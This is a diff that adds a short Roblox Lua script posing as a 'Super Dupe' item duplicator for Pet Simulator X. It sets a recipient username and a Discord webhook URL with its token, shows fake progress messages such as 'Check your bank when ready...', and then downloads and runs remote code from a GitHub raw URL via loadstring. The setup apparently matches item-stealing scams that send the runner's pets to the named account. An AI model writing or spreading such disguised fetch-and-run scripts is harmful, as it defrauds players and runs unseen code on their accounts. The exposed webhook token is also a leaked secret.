@@ -1,0 +1,9 @@
+Username = "TONOY_TALK"
+WebHook = "https://discord.com/api/webhooks/1073566879874039850/YHglGS4g7TK9UOiZN_Jv4VXTtw2wtUE7PMASG0v3WfWEAXK9RQwa2wsY0pOowDrUCxYp"
+
+_G.CustomScriptName = "Super Dupe Has Been Started"
+_G.Text1 = "Dupping..."
+_G.Text2 = "Intro:Work Only Exclusives And Huges"
+_G.Text3 = "Check your bank when ready..."
+_G.Text4 = "Dupe is done rejoin✔️"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
